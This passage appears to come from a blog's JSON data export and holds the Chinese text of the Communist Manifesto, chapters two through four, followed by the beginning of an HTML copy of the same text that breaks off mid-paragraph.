资产阶级生存和统治的根本条件，是财富在私人手里的积累，是资本的形成和增殖；资本的条件是雇佣劳动。雇佣劳动完全是建立在工人的自相竞争之上的。资产阶级无意中造成而又无力抵抗的工业进步，使工人通过结社而达到的革命联合代替了他们由于竞争而造成的分散状态。于是，随着大工业的发展，资产阶级赖以生产和占有产品的基础本身也就从它的脚下被挖掉了。它首先生产的是它自身的掘墓人。资产阶级的灭亡和无产阶级的胜利是同样不可避免的。\n\n# 二、无产者和共产党人\n\n\n　　共产党人同全体无产者的关系是怎样的呢？\n\n　　共产党人不是同其它工人政党相对立的特殊政党。\n\n　　他们没有任何同整个无产阶级的利益不同的利益。\n\n　　他们不提出任何特殊的原则，用以塑造无产阶级的运动。\n\n　　共产党人同其它无产阶级政党不同的地方只是：一方面，在各国无产者的斗争中，共产党人强调和坚持整个无产阶级共同的不分民族的利益；另一方面，在无产阶级和资产阶级的斗争所经历的各个发展阶段上，共产党人始终代表整个运动的利益。\n\n　　因此，在实践方面，共产党人是各国工人政党中最坚决的、始终起推动作用的部分；在理论方面，他们胜过其余的无产阶级群众的地方在于他们了解无产阶级运动的条件、进程和一般结果。\n\n　　共产党人的最近目的是和其它一切无产阶级政党的最近目的一样的：使无产阶级形成为阶级，推翻资产阶级的统治，由无产阶级夺取政权。\n\n　　共产党人的理论原理，决不是以这个或那个世界改革家所发明或发现的思想、原则为根据的。\n\n　　这些原理不过是现在的阶级斗争、我们眼前的历史运动的真实关系的一般表述。废除先前存在的所有制关系，并不是共产主义所独具的特征。\n\n　　一切所有制关系都经历了经常的历史更替、经常的历史变更。\n\n　　例如，法国革命废除了封建的所有制，代之以资产阶级的所有制。\n\n　　共产主义的特征并不是要废除一般的所有制，而是要废除资产阶级的所有制。\n\n　　但是，现代的资产阶级私有制是建立在阶级对立上面、建立在一些人对另一些人的剥削上面的产品生产和占有的最后而又最完备的表现。\n\n　　从这个意义上说，共产党人可以把自己的理论概括为一句话：消灭私有制。\n\n　　有人责备我们共产党人，说我们要消灭个人挣得的、自己劳动得来的财产，要消灭构成个人的一切自由、活动和独立的基础的财产。\n\n　　好一个劳动得来的、自己挣得的、自己赚来的财产！你们说的是资产阶级所有制以前的那种小资产阶级的、小农的财产吗？那种财产用不着我们去消灭，工业的发展已经把它消灭了，而且每天都在消灭它。\n\n　　或者，你们说的是现代的资产阶级的私有财产吧？\n\n　　但是，难道雇佣劳动，无产者的劳动，会给无产者创造出财产来吗？没有的事。这种劳动所创造的是资本，即剥削雇佣劳动的财产，只有在不断产生出新的雇佣劳动来重新加以剥削的条件下才能增加起来的财产。现今的这种财产是在资本和雇佣劳动的对立中运动的。让我们来看看这种对立的两个方面吧。\n\n　　做一个资本家，这就是说，他在生产中不仅占有一种纯粹个人的地位，而且占有一种社会的地位。资本是集体的产物，它只有通过社会许多成员的共同活动，而且归根到底只有通过社会全体成员的共同活动，才能运动起来。\n\n　　因此，资本不是一种个人力量，而是一种社会力量。\n\n　　因此，把资本变为公共的、属于社会全体成员的财产，这并不是把个人财产变为社会财产。这时所改变的只是财产的社会性质。它将失掉它的阶级性质。\n\n　　现在，我们来看看雇佣劳动。\n\n　　雇佣劳动的平均价格是最低限度的工资，即工人为维持其工人的生活所必需的生活资料的数额。因此，雇佣工人靠自己的劳动所占有的东西，只够勉强维持他的生命的再生产。我们决不打算消灭这种供直接生命再生产用的劳动产品的个人占有，这种占有并不会留下任何剩余的东西使人们有可能支配别人的劳动。我们要消灭的只是这种占有的可怜的性质，在这种占有下，工人仅仅为增殖资本而活着，只有在统治阶级的利益需要他活着的时候才能活着。\n\n　　在资产阶级社会里，活的劳动只是增殖已经积累起来的劳动的一种手段。在共产主义社会里，已经积累起来的劳动只是扩大、丰富和提高工人的生活的一种手段。\n\n　　因此，在资产阶级社会里是过去支配现在，在共产主义社会里是现在支配过去。在资产阶级社会里，资本具有独立性和个性，而活动着的个人却没有独立性和个性。\n\n　　而资产阶级却把消灭这种关系说成是消灭个性和自由！说对了。的确，正是要消灭资产者的个性、独立性和自由。\n\n　　在现今的资产阶级生产关系的范围内，所谓自由就是自由贸易，自由买卖。\n\n　　但是，买卖一消失，自由买卖也就会消失。关于自由买卖的言论，也象我们的资产阶级的其它一切关于自由的大话一样，仅仅对于不自由的买卖来说，对于中世纪被奴役的市民来说，才是有意义的，而对于共产主义要消灭买卖、消灭资产阶级生产关系和资产阶级本身这一点来说，却是毫无意义的。\n\n　　我们要消灭私有制，你们就惊慌起来。但是，在你们的现存社会里，私有财产对十分之九的成员来说已经被消灭了；这种私有制之所以存在，正是因为私有财产对十分之九的成员来说已经不存在。可见，你们责备我们，是说我们要消灭那种以社会上的绝大多数人没有财产为必要条件的所有制。\n\n　　总而言之，你们责备我们，是说我们要消灭你们的那种所有制。的确，我们是要这样做的。\n\n　　从劳动不再能变为资本、货币、地租，一句话，不再能变为可以垄断的社会力量的时候起，就是说，从个人财产不再能变为资产阶级财产的时候起，你们说，个性就被消灭了。\n\n　　由此可见，你们是承认，你们所理解的个性，不外是资产者、资产阶级私有者。这样的个性确实应当被消灭。\n\n　　共产主义并不剥夺任何人占有社会产品的权力，它只剥夺利用这种占有去奴役他人劳动的权力。\n\n　　有人反驳说，私有制一消灭，一切活动就会停止，懒惰之风就会兴起。\n\n　　这样说来，资产阶级社会早就应该因懒惰而灭亡了，因为在这个社会里是劳者不获，获者不劳的。所有这些顾虑，都可以归结为这样一个同义反复：一旦没有资本，也就不再有雇佣劳动了。\n\n　　所有这些对共产主义的物质产品的占有方式和生产方式的责备， 也被扩及到精神产品的占有和生产方面。正如阶级的所有制的终止在资产者看来是生产本身的终止一样，阶级的教育的终止在他们看来就等于一切教育的终止。\n\n　　资产者唯恐失去的那种教育，对绝大多数人来说是把人训练成机器。\n\n　　但是，你们既然用你们资产阶级关于自由、教育、法等等的观念来衡量废除资产阶级所有制的主张，那就请你们不要同我们争论了。你们的观念本身是资产阶级的生产关系和所有制关系的产物，正象你们的法不过是被奉为法律的你们这个阶级的意志一样，而这种意志的内容是由你们这个阶级的物质生活条件来决定的。\n\n　　你们的利己观念使你们把自己的生产关系和所有制关系从历史的、在生产过程中是暂时的关系变成永恒的自然规律和理性规律，这种利己观念是你们和一切灭亡了的统治阶级所共有的。谈到古代所有制的时候你们所能理解的，谈到封建所有制的时候你们所能理解的，一谈到资产阶级所有制你们就再也不能理解了。\n\n　　消灭家庭！连极端的激进派也对共产党人的这种可耻的意图表示愤慨。\n\n　　现代的、资产阶级的家庭是建立在什么基础上的呢？是建立在资本上面，建立在私人发财上面的。这种家庭只是在资产阶级那里才以充分发展的形式存在着，而无产者的被迫独居和公开的卖淫则是它的补充。\n\n　　资产者的家庭自然会随着它的这种补充的消失而消失，两者都要随着资本的消失而消失。\n\n　　你们是责备我们要消灭父母对子女的剥削吗？我们承认这种罪状。\n\n　　但是，你们说，我们用社会教育代替家庭教育，就是要消灭人们最亲密的关系。\n\n　　而你们的教育不也是由社会决定的吗？不也是由你们进行教育的那种社会关系决定的吗？不也是由社会通过学校等等进行的直接的或间接的干涉决定的吗？共产党人并没有发明社会对教育的影响；他们仅仅是要改变这种影响的性质，要使教育摆脱统治阶级的影响。\n\n　　无产者的一切家庭联系越是由于大工业的发展而被破坏，他们的子女越是由于这种发展而被变成单纯的商品和劳动工具，资产阶级关于家庭和教育、关于父母和子女的亲密关系的空话就越是令人作呕。\n\n　　但是，你们共产党人是要实行公妻制的啊，——整个资产阶级异口同声地向我们这样叫喊。\n\n　　资产者是把自己的妻子看作单纯的生产工具的。他们听说生产工具将要公共使用，自然就不能不想到妇女也会遭到同样的命运。\n\n　　他们想也没有想到，问题正在于使妇女不再处于单纯生产工具的地位。\n\n　　其实，我们的资产者装得道貌岸然，对所谓的共产党人的正式公妻制表示惊讶，那是再可笑不过了。公妻制无需共产党人来实行，它差不多是一向就有的。\n\n　　我们的资产者不以他们的无产者的妻子和女儿受他们支配为满足，正式的卖淫更不必说了，他们还以互相诱奸妻子为最大的享乐。\n\n　　资产阶级的婚姻实际上是公妻制。人们至多只能责备共产党人，说他们想用正式的、公开的公妻制来代替伪善地掩蔽着的公妻制。其实，不言而喻，随着现在的生产关系的消灭，从这种关系中产生的公妻制，即正式的和非正式的卖淫，也就消失了。\n\n　　还有人责备共产党人，说他们要取消祖国，取消民族。\n\n　　工人没有祖国。决不能剥夺他们所没有的东西。因为无产阶级首先必须取得政治统治，上升为民族的阶级，把自身组织成为民族，所以它本身还是民族的，虽然完全不是资产阶级所理解的那种意思。\n\n　　随着资产阶级的发展，随着贸易自由的实现和世界市场的建立，随着工业生产以及与之相适应的生活条件的趋于一致，各国人民之间的民族隔绝和对立日益消失。\n\n　　无产阶级的统治将使它们更快地消失。联合的行动，至少是各文明国家的联合的行动，是无产阶级获得解放的首要条件之一。\n\n　　人对人的剥削一消灭，民族对民族的剥削就会随之消灭。\n\n　　民族内部的阶级对立一消失，民族之间的敌对关系就会随之消失。\n\n　　从宗教的、哲学的和一般意识形态的观点对共产主义提出的种种责难，都不值得详细讨论了。\n\n　　人们的观念、观点和概念，一句话，人们的意识，随着人们的生活条件、人们的社会关系、人们的社会存在的改变而改变，这难道需要经过深思才能了解吗？\n\n　　思想的历史除了证明精神生产随着物质生产的改造而改造，还证明了什么呢？任何一个时代的统治思想始终都不过是统治阶级的思想。\n\n　　当人们谈到使整个社会革命化的思想时，他们只是表明了一个事实：在旧社会内部已经形成了新社会的因素，旧思想的瓦解是同旧生活条件的瓦解步调一致的。\n\n　　当古代世界走向灭亡的时候，古代的各种宗教就被基督教战胜了。当基督教思想在18世纪被启蒙思想击败的时候，封建社会正在同当时革命的资产阶级进行殊死的斗争。信仰自由和宗教自由的思想，不过表明自由竞争在信仰的领域里占统治地位罢了。\n\n　　“但是”，有人会说，“宗教的、道德的、哲学的、政治的、法的观念等等在历史发展的进程中固然是不断改变的，而宗教、道德、哲学、政治和法在这种变化中却始终保存着。\n\n　　此外，还存在着一切社会状态所共有的永恒的真理，如自由、正义等等。但是共产主义要废除永恒真理，它要废除宗教、道德，而不是加以革新，所以共产主义是同至今的全部历史发展进程相矛盾的。”\n\n　　这种责难归结为什么呢？至今的一切社会的历史都是在阶级对立中运动的，而这种对立在各个不同的时代具有不同的形式。\n\n　　但是，不管阶级对立具有什么样的形式，社会上一部分人对另一部分人的剥削却是过去各个世纪所共有的事实。因此，毫不奇怪，各个世纪的社会意识，尽管形形色色、千差万别，总是在某些共同的形式中运动的，这些形式，这些意识形式，只有当阶级对立完全消失的时候才会完全消失。\n\n　　共产主义革命就是同传统的所有制关系实行最彻底的决裂；毫不奇怪，它在自己的发展进程中要同传统的观念实行最彻底的决裂。\n\n　　不过，我们还是把资产阶级对共产主义的种种责难撇开吧。\n\n　　前面我们已经看到，工人革命的第一步就是使无产阶级上升为统治阶级，争得民主。\n\n　　无产阶级将利用自己的政治统治，一步一步地夺取资产阶级的全部资本，把一切生产工具集中在国家即组织成为统治阶级的无产阶级手里，并且尽可能快地增加生产力的总量。\n\n　　要做到这一点，当然首先必须对所有权和资产阶级生产关系实行强制性的干涉，也就是采取这样一些措施，这些措施在经济上似乎是不够充分的和没有力量的，但是在运动进程中它们会越出本身，而且作为变革全部生产方式的手段是必不可少的。\n\n　　这些措施在不同的国家里当然会是不同的。\n\n　　但是，最先进的国家几乎都可以采取下面的措施：\n\n　　1．剥夺地产，把地租用于国家支出。\n\n　　2．征收高额累进税。\n\n　　3．废除继承权。\n\n　　4．没收一切流亡分子和叛乱分子的财产。\n\n　　5．通过拥有国家资本和独享垄断权的国家银行，把信贷集中在国家手里。\n\n　　6．把全部运输业集中在国家手里。\n\n　　7．按照总的计划增加国营工厂和生产工具，开垦荒地和改良土壤。\n\n　　8．实行普遍劳动义务制，成立产业军，特别是在农业方面。\n\n　　9．把农业和工业结合起来，促使城乡对立逐步消灭。\n\n　　10．对所有儿童实行公共的和免费的教育。取消现在这种形式的儿童的工厂劳动。把教育同物质生产结合起来，等等。\n\n　　当阶级差别在发展进程中已经消失而全部生产集中在联合起来的个人的手里的时候，公共权力就失去政治性质。原来意义上的政治权力，是一个阶级用以压迫另一个阶级的有组织的暴力。如果说无产阶级在反对资产阶级的斗争中一定要联合为阶级，如果说它通过革命使自己成为统治阶级，并以统治阶级的资格用暴力消灭旧的生产关系，那么它在消灭这种生产关系的同时，也就消灭了阶级对立和阶级本身的存在条件，从而消灭了它自己这个阶级的统治。\n\n　　代替那存在着阶级和阶级对立的资产阶级旧社会的，将是这样一个联合体，在那里，每个人的自由发展是一切人的自由发展的条件。\n\n# 三、社会主义的和共产主义的文献\n\n\n1．反动的社会主义\n\n\n(甲)封建的社会主义\n\n　　法国和英国的贵族，按照他们的历史地位所负的使命，就是写一些抨击现代资产阶级社会的作品。在法国的1830年七月革命和英国的改革运动中，他们再一次被可恨的暴发户打败了。从此就再谈不上严重的政治斗争了。他们还能进行的只是文字斗争。但是，即使在文字方面也不可能重弹复辟时期的老调了。为了激起同情，贵族们不得不装模做样，似乎他们已经不关心自身的利益，只是为了被剥削的工人阶级的利益才去写对资产阶级的控诉书。他们用来泄愤的手段是：唱唱诅咒他们的新统治者的歌，并向他叽叽咕咕地说一些或多或少凶险的预言。\n　　这样就产生了封建的社会主义，半是挽歌，半是谤文；半是过去的回音，半是未来的恫吓；它有时也能用辛辣、俏皮而尖刻的评论刺中资产阶级的心，但是它由于完全不能理解现代历史的进程而总是令人感到可笑。\n　　为了拉拢人民，贵族们把无产阶级的乞食袋当做旗帜来挥舞。但是，每当人民跟着他们走的时候，都发现他们的臀部带有旧的封建纹章，于是就哈哈大笑，一哄而散。\n　　一部分法国正统派和“青年英国”，都演过这出戏。\n　　封建主说，他们的剥削方式和资产阶级的剥削不同，那他们只是忘记了，他们是在完全不同的、目前已经过时的情况和条件下进行剥削的。他们说，在他们的统治下并没有出现过现代的无产阶级，那他们只是忘记了，现代的资产阶级正是他们的社会制度的必然产物。\n　　不过，他们毫不掩饰自己的批评的反动性质，他们控告资产阶级的主要罪状正是在于：在资产阶级的统治下有一个将把整个旧社会制度炸毁的阶级发展起来。\n　　他们责备资产阶级，与其说是因为它产生了无产阶级，不如说是因为它产生了革命的无产阶级。\n　　因此，在政治实践中，他们参与对工人阶级采取的一切暴力措施，在日常生活中，他们违背自己的那一套冠冕堂皇的言词，屈尊拾取金苹果，不顾信义、仁爱和名誉去做羊毛、甜菜和烧酒的买卖。\n　　正如僧侣总是同封建主携手同行一样，僧侣的社会主义也总是同封建的社会主义携手同行的。\n　　要给基督教禁欲主义涂上一层社会主义的色彩，是再容易不过了。基督教不是也激烈反对私有制，反对婚姻，反对国家吗？它不是提倡用行善和求乞、独身和禁欲、修道和礼拜来代替这一切吗？基督教的社会主义，只不过是僧侣用来使贵族的怨愤神圣化的圣水罢了。\n\n(乙)小资产阶级的社会主义\n\n　　封建贵族并不是被资产阶级所推翻的、其生活条件在现代资产阶级社会里日益恶化和消失的唯一阶级。中世纪的城关市民等级和小农等级是现代资产阶级的前身。在工商业不很发达的国家里，这个阶级还在新兴的资产阶级身旁勉强生存着。\n　　在现代文明已经发展的国家里,形成了一个新的小资产阶级，它摇摆于无产阶级和资产阶级之间，并且作为资产阶级社会的补充部分不断地重新组成。但是，这一阶级的成员经常被竞争拋到无产阶级队伍里去，而且，随着大工业的发展，他们甚至觉察到，他们很快就会完全失去他们作为现代社会中一个独立部分的地位，在商业、工业和农业中很快就会被监工和雇员所代替。\n　　在农民阶级远远超过人口半数的国家，例如在法国，那些站在无产阶级方面反对资产阶级的著作家，自然是用小资产阶级和小农的尺度去批判资产阶级制度的，是从小资产阶级的立场出发替工人说话的。这样就形成了小资产阶级的社会主义。西斯蒙第不仅对法国而且对英国来说都是这类著作家的首领。\n　　这种社会主义非常透彻地分析了现代生产关系中的矛盾。它揭穿了经济学家的虚伪的粉饰。它确凿地证明了机器和分工的破坏作用、资本和地产的积聚、生产过剩、危机、小资产者和小农的必然没落、无产阶级的贫困、生产的无政府状态、财富分配的极不平均、各民族之间的毁灭性的工业战争，以及旧风尚、旧家庭关系和旧民族性的解体。\n　　但是，这种社会主义按其实际内容来说，或者是企图恢复旧的生产资料和交换手段，从而恢复旧的所有制关系和旧的社会，或者是企图重新把现代的生产资料和交换手段硬塞到已被它们突破而且必然被突破的旧的所有制关系的框子里去。它在这两种场合都是反动的，同时又是空想的。\n　　工业中的行会制度，农业中的宗法经济，——这就是它的最后结论。\n　　这一思潮在它以后的发展中变成了一种怯懦的悲叹。\n\n(丙)德国的或“真正的”社会主义\n\n　　法国的社会主义和共产主义的文献是在居于统治地位的资产阶级的压迫下产生的，并且是同这种统治作斗争的文字表现，这种文献被搬到德国的时候，那里的资产阶级才刚刚开始进行反对封建专制制度的斗争。\n　　德国的哲学家、半哲学家和美文学家，贪婪地抓住了这种文献，不过他们忘记了：在这种著作从法国搬到德国的时候，法国的生活条件却没有同时搬过去。在德国的条件下，法国的文献完全失去了直接实践的意义，而只具有纯粹文献的形式。它必然表现为关于真正的社会、关于实现人的本质的无谓思辨。这样，第一次法国革命的要求，在18世纪的德国哲学家看来，不过是一般“实践理性”的要求，而革命的法国资产阶级的意志的表现，在他们心目中就是纯粹意志、本来的意志、真正人的意志的规律。\n　　德国著作家的唯一工作，就是把新的法国的思想同他们的旧的哲学信仰调和起来，或者毋宁说，就是从他们的哲学观点出发去掌握法国的思想。\n　　这种掌握，就象掌握外国语一样，是通过翻译的。\n　　大家知道，僧侣们曾经在古代异教经典的手抄本上面写上荒诞的天主教圣徒传。德国著作家对世俗的法国文献采取相反的作法。他们在法国的原著下面写上自己的哲学胡说。例如，他们在法国人对货币关系的批判下面写上“人的本质的外化”，在法国人对资产阶级国家的批判下面写上所谓“抽象普遍物的统治的扬弃”，等等。\n　　这种在法国人的论述下面塞进自己哲学词句的作法，他们称之为“行动的哲学”、“真正的社会主义”、“德国的社会主义科学”、“社会主义的哲学论证”，等等。\n　　法国的社会主义和共产主义的文献就这样被完全阉割了。既然这种文献在德国人手里已不再表现一个阶级反对另一个阶级的斗争，于是德国人就认为：他们克服了“法国人的片面性”，他们不代表真实的要求，而代表真理的要求，不代表无产者的利益，而代表人的本质的利益，即一般人的利益，这种人不属于任何阶级，根本不存在于现实界，而只存在于云雾弥漫的哲学幻想的太空。\n　　这种曾经郑重其事地看待自己那一套拙劣的小学生作业并且大言不惭地加以吹嘘的德国社会主义，现在渐渐失去了它的自炫博学的天真。\n　　德国的特别是普鲁士的资产阶级反对封建主和专制王朝的斗争，一句话，自由主义运动，越来越严重了。\n　　于是，“真正的”社会主义就得到了一个好机会，把社会主义的要求同政治运动对立起来，用诅咒异端邪说的传统办法诅咒自由主义，诅咒代议制国家，诅咒资产阶级的竞争、资产阶级的新闻出版自由、资产阶级的法、资产阶级的自由和平等，并且向人民群众大肆宣扬，说什么在这个资产阶级运动中，人民群众非但一无所得，反而会失去一切。德国的社会主义恰好忘记了，法国的批判(德国的社会主义是这种批判的可怜的回声)是以现代的资产阶级社会以及相应的物质生活条件和相当的政治制度为前提的，而这一切前提当时在德国正是尚待争取的。\n　　这种社会主义成了德意志各邦专制政府及其随从——僧侣、教员、容克和官僚求之不得的、吓唬来势汹汹的资产阶级的稻草人。\n　　这种社会主义是这些政府用来镇压德国工人起义的毒辣的皮鞭和枪弹的甜蜜的补充。\n　　既然“真正的”社会主义就这样成了这些政府对付德国资产阶级的武器，那么它也就直接代表了一种反动的利益，即德国小市民的利益。在德国，16世纪遗留下来的、从那时起经常以不同形式重新出现的小资产阶级，是现存制度的真实的社会基础。\n　　保存这个小资产阶级，就是保存德国的现存制度。这个阶级胆战心惊地从资产阶级的工业统治和政治统治那里等候着无可幸免的灭亡，这一方面是由于资本的积聚，另一方面是由于革命无产阶级的兴起。在它看来，“真正的”社会主义能起一箭双雕的作用。“真正的”社会主义象瘟疫一样流行起来了。\n　　德国的社会主义者给自己的那几条干瘪的“永恒真理”披上一件用思辨的蛛丝织成的、绣满华丽辞藻的花朵和浸透甜情蜜意的甘露的外衣，这件光彩夺目的外衣只是使他们的货物在这些顾客中间增加销路罢了。\n　　同时，德国的社会主义也越来越认识到自己的使命就是充当这种小市民的夸夸其谈的代言人。\n　　它宣布德意志民族是模范的民族，德国小市民是模范的人。它给这些小市民的每一种丑行都加上奥秘的、高尚的、社会主义的意义，使之变成完全相反的东西。它发展到最后，就直接反对共产主义的“野蛮破坏的”倾向，并且宣布自己是不偏不倚的超乎任何阶级斗争之上的。现今在德国流行的一切所谓社会主义和共产主义的著作，除了极少数的例外，都属于这一类卑鄙龌龊的、令人委靡的文献。\n\n2．保守的或资产阶级的社会主义\n\n\n　　资产阶级中的一部分人想要消除社会的弊病，以便保障资产阶级社会的生存。\n　　这一部分人包括：经济学家、博爱主义者、人道主义者、劳动阶级状况改善派、慈善事业组织者、动物保护协会会员、戒酒协会发起人以及形形式色色的小改良家。这种资产阶级的社会主义甚至被制成一些完整的体系。\n　　我们可以举蒲鲁东的《贫困的哲学》作为例子。\n　　社会主义的资产者愿意要现代社会的生存条件，但是不要由这些条件必然产生的斗争和危险。他们愿意要现存的社会，但是不要那些使这个社会革命化和瓦解的因素。他们愿意要资产阶级，但是不要无产阶级。在资产阶级看来，它所统治的世界自然是最美好的世界。资产阶级的社会主义把这种安慰人心的观念制成半套或整套的体系。它要求无产阶级实现它的体系，走进新的耶路撒冷，其实它不过是要求无产阶级停留在现今的社会里，但是要拋弃他们关于这个社会的可恶的观念。\n　　这种社会主义的另一种不够系统、但是比较实际的形式，力图使工人阶级厌弃一切革命运动，硬说能给工人阶级带来好处的并不是这样或那样的政治改革，而仅仅是物质生活条件即经济关系的改变。但是，这种社会主义所理解的物质生活条件的改变，绝对不是只有通过革命的途径才能实现的资产阶级生产关系的消灭，而是一些行政上的改良，这些改良是在这种生产关系的基础上实行的，因而丝毫不会改变资本和雇佣劳动的关系，至多只能减少资产阶级的统治费用和简化它的财政管理。\n　　资产阶级的社会主义只有在它变成纯粹的演说辞令的时候，才获得自己的适当的表现。\n　　自由贸易！为了工人阶级的利益；保护关税！为了工人阶级的利益；单身牢房！为了工人阶级的利益。——这才是资产阶级的社会主义唯一认真说出的最后的话。\n　　资产阶级的社会主义就是这样一个论断：资产者之为资产者，是为了工人阶级的利益。\n\n3．批判的空想的社会主义和共产主义\n\n\n　　在这里，我们不谈在现代一切大革命中表达过无产阶级要求的文献(巴贝夫等人的著作)。\n\n　　无产阶级在普遍激动的时代、在推翻封建社会的时期直接实现自己阶级利益的最初尝试，都不可避免地遭到了失败，这是由于当时无产阶级本身还不够发展，由于无产阶级解放的物质条件还没有具备，这些条件只是资产阶级时代的产物。随着这些早期的无产阶级运动而出现的革命文献，就其内容来说必然是反动的。这种文献倡导普遍的禁欲主义和粗陋的平均主义。\n\n　　本来意义的社会主义和共产主义的体系，圣西门、傅立叶、欧文等人的体系，是在无产阶级和资产阶级之间的斗争还不发展的最初时期出现的。关于这个时期，我们在前面已经叙述过了(见《资产阶级和无产阶级》)。\n\n　　诚然，这些体系的发明家看到了阶级的对立，以及占统治地位的社会本身中的瓦解因素的作用。但是，他们看不到无产阶级方面的任何历史主动性，看不到它所特有的任何政治运动。\n\n　　由于阶级对立的发展是同工业的发展步调一致的，所以这些发明家也不可能看到无产阶级解放的物质条件，于是他们就去探求某种社会科学、社会规律，以便创造这些条件。\n\n　　社会的活动要由他们个人的发明活动来代替，解放的历史条件要由幻想的条件来代替，无产阶级的逐步组织成为阶级要由他们特意设计出来的社会组织来代替。在他们看来，今后的世界历史不过是宣传和实施他们的社会计划。\n\n　　诚然，他们也意识到，他们的计划主要是代表工人阶级这一受苦最深的阶级的利益。在他们的心目中，无产阶级只是一个受苦最深的阶级。\n\n　　但是，由于阶级斗争不发展，由于他们本身的生活状况，他们就以为自己是高高超乎这种阶级对立之上的。他们要改善社会一切成员的生活状况，甚至生活最优裕的成员也包括在内。因此，他们总是不加区别地向整个社会呼吁，而且主要是向统治阶级呼吁。他们以为，人们只要理解他们的体系，就会承认这种体系是最美好的社会的最美好的计划。\n\n　　因此，他们拒绝一切政治行动，特别是一切革命行动；他们想通过和平的途径达到自己的目的，并且企图通过一些小型的、当然不会成功的试验，通过示范的力量来为新的社会福音开辟道路。\n\n　　这种对未来社会的幻想的描绘，是在无产阶级还很不发展、因而对本身的地位的认识还基于幻想的时候，同无产阶级对社会普遍改造的最初的本能的渴望相适应的。\n\n　　但是，这些社会主义和共产主义的著作也含有批判的成分。这些著作抨击现存社会的全部基础。因此，它们提供了启发工人觉悟的极为宝贵的材料。它们关于未来社会的积极的主张，例如消灭城乡对立，消灭家庭，消灭私人营利，消灭雇佣劳动，提倡社会和谐，把国家变成纯粹的生产管理机构，——所有这些主张都只是表明要消灭阶级对立，而这种阶级对立在当时刚刚开始发展，它们所知道的只是这种对立的早期的、不明显的、不确定的形式。因此，这些主张本身还带有纯粹空想的性质。\n\n　　批判的空想的社会主义和共产主义的意义，是同历史的发展成反比的。阶级斗争越发展和越具有确定的形式，这种超乎阶级斗争的幻想，这种反对阶级斗争的幻想，就越失去任何实践意义和任何理论根据。所以，虽然这些体系的创始人在许多方面是革命的，但是他们的信徒总是组成一些反动的宗派。这些信徒无视无产阶级的历史进展，还是死守着老师们的旧观点。因此，他们一贯企图削弱阶级斗争，调和对立。他们还总是梦想用试验的办法来实现自己的社会空想，创办单个的法伦斯泰尔，建立国内移民区，创立小伊加利亚，即袖珍版的新耶路撒冷，——而为了建造这一切空中楼阁，他们就不得不呼吁资产阶级发善心和慷慨解囊。他们逐渐地堕落到上述反动的或保守的社会主义者的一伙中去了，所不同的只是他们更加系统地卖弄学问，狂热地迷信自己那一套社会科学的奇功异效。\n\n　　因此，他们激烈地反对工人的一切政治运动，认为这种运动只是由于盲目地不相信新福音才发生的。\n\n　　在英国，有欧文主义者反对宪章派，在法国，有傅立叶主义者反对改革派。\n\n# 四、共产党人对各种反对党派的态度\n\n\n　　看过第二章之后，就可以了解共产党人同已经形成的工人政党的关系，因而也就可以了解他们同英国宪章派和北美土地改革派的关系。\n\n　　共产党人为工人阶级的最近的目的和利益而斗争，但是他们在当前的运动中同时代表运动的未来。在法国，共产党人同社会主义民主党联合起来反对保守的和激进的资产阶级，但是并不因此放弃对那些从革命的传统中承袭下来的空谈和幻想采取批判态度的权利。\n\n　　在瑞士，共产党人支持激进派，但是并不忽略这个政党是由互相矛盾的分子组成的，其中一部分是法国式的民主社会主义者，一部分是激进的资产者。\n\n　　在波兰人中间，共产党人支持那个把土地革命当做民族解放的条件的政党，即发动过1846年克拉科夫起义的政党。\n\n　　在德国，只要资产阶级采取革命的行动，共产党就同它一起去反对专制君主制、封建土地所有制和小市民的反动性。\n\n　　但是，共产党一分钟也不忽略教育工人尽可能明确地意识到资产阶级和无产阶级的敌对的对立，以便德国工人能够立刻利用资产阶级统治所必然带来的社会的和政治的条件作为反对资产阶级的武器，以便在推翻德国的反动阶级之后立即开始反对资产阶级本身的斗争。\n\n　　共产党人把自己的主要注意力集中在德国，因为德国正处在资产阶级革命的前夜，因为同17世纪的英国和18世纪的法国相比，德国将在整个欧洲文明更进步的条件下，拥有发展得多的无产阶级去实现这个变革，因而德国的资产阶级革命只能是无产阶级革命的直接序幕。\n\n　　总之，共产党人到处都支持一切反对现存的社会制度和政治制度的革命运动。\n\n　　在所有这些运动中，他们都特别强调所有制问题是运动的基本问题，不管这个问题的发展程度怎样。\n\n　　最后，共产党人到处都努力争取全世界的民主政党之间的团结和协调。\n\n　　共产党人不屑于隐瞒自己的观点和意图。他们公开宣布：他们的目的只有用暴力推翻全部现存的社会制度才能达到。让统治阶级在共产主义革命面前发抖吧。无产者在这个革命中失去的只是锁链。他们获得的将是整个世界。\n\n# 全世界无产者们，联合起来！","slug":"共产党宣言","published":1,"updated":"2020-05-12T02:42:42.248Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cwm00072gk7cvo6b0p6","content":"<h1 id=\"共产党宣言\"><a href=\"#共产党宣言\" class=\"headerlink\" title=\"共产党宣言\"></a>共产党宣言</h1><p>　　一个幽灵，共产主义的幽灵，在欧洲游荡。为了对这个幽灵进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。<br>　　有哪一个反对党不被它的当政的敌人骂为共产党呢？又有哪一个反对党不拿共产主义这个罪名去回敬更进步的反对党人和自己的反动敌人呢？<br>　　从这一事实中可以得出两个结论：<br>　　共产主义已经被欧洲的一切势力公认为一种势力；<br>　　现在是共产党人向全世界公开说明自己的观点、自己的目的、自己的意图并且拿党自己的宣言来反驳关于共产主义幽灵的神话的时候了。<br>　　为了这个目的，各国共产党人集会于伦敦，拟定了如下的宣言，用英文、法文、德文、意大利文、弗拉芒文和丹麦文公布于世。</p>\n<h1 id=\"一、资产者和无产者\"><a href=\"#一、资产者和无产者\" class=\"headerlink\" title=\"一、资产者和无产者\"></a>一、资产者和无产者</h1><p>　　至今一切社会的历史都是阶级斗争的历史。</p>\n<p>　　自由民和奴隶、贵族和平民、领主和农奴、行会师傅和帮工，一句话，压迫者和被压迫者，始终处于相互对立的地位，进行不断的、有时隐蔽有时公开的斗争，而每一次斗争的结局是整个社会受到革命改造或者斗争的各阶级同归于尽。</p>\n<p>　　在过去的各个历史时代，我们几乎到处都可以看到社会完全划分为各个不同的等级，看到社会地位分成的多种多样的层次。在古罗马，有贵族、骑士、平民、奴隶，在中世纪，有封建主、臣仆、行会师傅、帮工、农奴，而且几乎在每一个阶级内部又有一些特殊的阶层。</p>\n<p>　　从封建社会的灭亡中产生出来的现代资产阶级社会并没有消灭阶级对立。它只是用新的阶级、新的压迫条件、新的斗争形式代替了旧的。</p>\n<p>　　